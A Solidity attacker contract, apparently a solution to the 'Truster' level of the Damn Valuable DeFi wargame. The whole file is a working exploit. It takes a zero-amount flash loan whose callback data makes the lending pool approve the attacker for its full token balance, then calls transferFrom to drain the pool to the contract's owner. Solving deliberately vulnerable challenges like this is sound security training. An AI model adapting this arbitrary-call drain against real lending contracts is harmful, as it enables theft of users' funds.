// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../../truster/TrusterLenderPool.sol";
import "../../DamnValuableToken.sol";

contract TrusterAttacker {
    TrusterLenderPool private immutable pool;
    IERC20 public immutable damnValuableToken;

    address private immutable owner;

    constructor(address payable _pool, address _damnValuableToken) {
        pool = TrusterLenderPool(_pool);
        damnValuableToken = DamnValuableToken(_damnValuableToken);
        owner = msg.sender;
    }

    function exploit() external {
        require(msg.sender == owner, "niet");
        uint256 contractTokenBalance = damnValuableToken.balanceOf(address(pool));
        pool.flashLoan(
            0,
            address(this),
            address(damnValuableToken),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                contractTokenBalance
            )
        );
        damnValuableToken.transferFrom(
            address(pool), owner, contractTokenBalance
        );
    }
}